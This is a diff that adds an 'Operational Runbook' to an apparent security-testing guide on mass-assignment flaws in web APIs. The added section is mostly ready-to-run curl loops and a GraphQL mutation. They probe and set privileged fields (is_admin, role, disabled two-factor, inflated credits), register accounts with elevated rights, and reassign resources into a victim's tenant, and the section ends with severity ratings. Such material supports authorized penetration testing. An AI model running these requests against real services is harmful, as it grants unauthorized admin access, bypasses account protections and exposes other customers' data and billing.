@@ -110,6 +110,145 @@ Mass assignment binds client-supplied fields directly into models/DTOs without f
 - Race two updates: first sets forbidden field, second normalizes
 - Final state may retain forbidden change
 
+## Operational Runbook
+
+Once a `POST /users` or `PATCH /users/{id}` endpoint is identified, this is the canonical exploitation flow.
+
+### Step 1 — capture the baseline response
+
+```bash
+# Capture YOUR OWN user record — every field you can see is a candidate
+USER_JSON=$(curl -s '<TARGET>/api/users/me' -H "Authorization: Bearer $TOKEN")
+echo "$USER_JSON" | jq .
+# Look for: id, email, role, is_admin, plan, status, owner_id, ...
+```
+
+The fields you see in the GET response are the fields the model serializer exposes. Mass-assignment is when those (or hidden) fields are *settable* via PATCH/POST despite never appearing in the API spec.
+
+### Step 2 — probe the sensitive field dictionary
+
+```bash
+# Build a candidate list — common privilege-escalation field names
+CANDIDATES=(
+    "role=admin"
+    "is_admin=true"
+    "isAdmin=true"
+    "isStaff=true"
+    "is_staff=true"
+    "is_superuser=true"
+    "permissions=[\"admin\"]"
+    "plan=enterprise"
+    "subscription_tier=ultimate"
+    "credits=999999"
+    "verified=true"
+    "email_verified=true"
+    "two_factor_enabled=false"
+    "owner_id=1"
+    "tenant_id=victim_tenant"
+    "status=approved"
+    "deleted=false"
+)
+
+# Try setting each on YOUR OWN record
+for kv in "${CANDIDATES[@]}"; do
+    k="${kv%%=*}"; v="${kv##*=}"
+    resp=$(curl -s -X PATCH "<TARGET>/api/users/$MY_ID" \
+        -H "Authorization: Bearer $TOKEN" \
+        -H 'Content-Type: application/json' \
+        -d "{\"$k\":$v}" -w '\n%{http_code}')
+    echo "$kv → ${resp##*$'\n'}"
+done
+
+# Re-fetch your record after each successful PATCH
+curl -s '<TARGET>/api/users/me' -H "Authorization: Bearer $TOKEN" | jq '.role,.is_admin,.plan'
+```
+
+A 2xx response on a sensitive field that the API spec doesn't document as settable → mass-assignment.
+
+### Step 3 — privilege escalation chain (the killer impact)
+
+```bash
+# Combo: set is_admin=true + role=admin on yourself
+curl -s -X PATCH "<TARGET>/api/users/$MY_ID" \
+    -H "Authorization: Bearer $TOKEN" \
+    -H 'Content-Type: application/json' \
+    -d '{"is_admin":true,"role":"admin"}' -w '\n%{http_code}\n'
+
+# Re-fetch — confirm escalation
+curl -s '<TARGET>/api/users/me' -H "Authorization: Bearer $TOKEN" | jq .
+
+# Try previously-403 admin endpoints — should now work
+curl -s '<TARGET>/api/admin/users' -H "Authorization: Bearer $TOKEN"
+```
+
+### Step 4 — registration-time mass assignment
+
+Sometimes only PATCH is hardened but POST /register isn't:
+
+```bash
+# Try registering with elevated fields in the body
+curl -s -X POST '<TARGET>/api/register' \
+    -H 'Content-Type: application/json' \
+    -d '{
+        "email":"attacker@x",
+        "password":"pwn",
+        "role":"admin",
+        "is_admin":true,
+        "subscription":"enterprise",
+        "credits":999999
+    }'
+
+# Login as the new account, confirm elevated state
+NEW_TOKEN=$(curl -s -X POST '<TARGET>/api/login' \
+    -d '{"email":"attacker@x","password":"pwn"}' | jq -r '.token')
+curl -s '<TARGET>/api/users/me' -H "Authorization: Bearer $NEW_TOKEN"
+```
+
+### Step 5 — cross-tenant via owner / tenant fields
+
+```bash
+# Change ownership of an existing resource to victim's tenant
+curl -s -X PATCH "<TARGET>/api/orgs/$MY_ORG/billing" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"tenant_id":"victim_tenant_uuid"}'
+
+# Or create a resource directly in victim's tenant by spoofing owner_id
+curl -s -X POST "<TARGET>/api/files" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"name":"attack","owner_id":"victim_user_id","content":"..."}'
+```
+
+### Step 6 — GraphQL mutation mass-assignment
+
+```graphql
+mutation {
+  updateUser(id: "MY_ID", input: {
+    role: "ADMIN"
+    isAdmin: true
+    permissions: ["*"]
+  }) {
+    id role isAdmin
+  }
+}
+```
+
+Send via:
+
+```bash
+curl -s -X POST '<TARGET>/graphql' \
+    -H "Authorization: Bearer $TOKEN" \
+    -H 'Content-Type: application/json' \
+    -d '{"query":"mutation { updateUser(id: \"MY_ID\", input: { role: \"ADMIN\", isAdmin: true }) { id role } }"}'
+```
+
+GraphQL often binds input objects directly to the ORM model — even sneakier mass-assignment than REST.
+
+### Step 7 — severity rules
+
+- **Critical** — escalated to admin / staff role; cross-tenant data access; payment / credits manipulation
+- **High** — flipped is-verified / 2fa / status; reduced rate-limits; bypassed feature gates
+- **Medium** — non-security fields settable but no immediate impact
+
 ## Testing Methodology
 
 1. **Identify endpoints** - Create/update endpoints and GraphQL mutations
